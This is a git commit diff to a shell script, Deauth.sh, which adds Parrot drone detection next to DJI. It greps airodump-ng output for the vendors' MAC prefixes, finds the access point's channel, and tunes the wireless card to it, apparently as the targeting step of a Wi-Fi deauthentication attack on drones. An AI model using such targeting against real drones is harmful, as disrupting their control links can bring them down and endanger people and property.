fa90d560f3549c7de5ffbe4736abad149a702676
Tevon <tjw0018@uah.edu>
2016-12-10 01:52:04 +0000

    Added Parrot detection.

--- Scripts/Deauth.sh
+++ Scripts/Deauth.sh
@@ -6,17 +6,39 @@
 	i=0
 	while [ $i -eq 0 ]
 	do
-		apMAC=$(grep -m 1 -Eo "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
-		apCh=$(grep -m 1 -E "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv | cut -d "," -f 4)
-	# Search and trim MAC
+		apMAC=$(grep -m 1 -Eo "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv) 
+		if [ "$apMAC" = "" ]; then
+		apMAC=$(grep -m 1 -Eo "90:03:B7:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
+		fi
+		if [ "$apMAC" = "" ]; then 
+		apMAC=$(grep -m 1 -Eo "A0:14:3D:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
+		fi
+		if [ "$apMAC" = "" ]; then
+		apMAC=$(grep -m 1 -Eo "00:26:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
+		fi
+		if [ "$apMAC" = "" ]; then
+		apMAC=$(grep -m 1 -Eo "00:12:1C:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
+		fi
+		if [ "$apMAC" = "" ]; then
+		apMAC=$(grep -m 1 -Eo "90:3A:E6:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
+		fi
+
+		apCh=$(grep -m 1 -E "$apMAC" dump-01.csv | cut -d "," -f 4)
+
 		ap1stHalf=$(echo $apMAC | cut -c 1-9)	
 
 		if [ "$ap1stHalf" = "60:60:1F:" ]; then # [0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]; then
-			tput setaf 1; echo "Target AP Found!$(tput sgr 0)"
-			echo $apMAC
+			tput setaf 1; echo "DJI AP Found!$(tput sgr 0)"
+			echo "DJI MAC: " $apMAC
 			i=1
 			kill $(ps -e | grep "airodump-ng" | awk '{print $1}') 		
 		fi	# If MAC not found, search again
+		if [ "$ap1stHalf" = "90:03:B7:" ] || [ "$ap1stHalf" = "A0:14:3D:" ] || [ "$ap1stHalf" = "00:26:7E:" ] || [ "$ap1stHalf" = "00:12:1C:" ] || [ "$ap1stHalf" = "90:3A:E6:" ]; then # [0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]; then
+			tput setaf 1; echo "Parrot AP Found!$(tput sgr 0)"
+			echo "Parrot MAC: " $apMAC
+			i=1
+			kill $(ps -e | grep "airodump-ng" | awk '{print $1}') 		
+		fi			
 	done
 	echo $apCh
 	iwconfig wlan0 channel $apCh
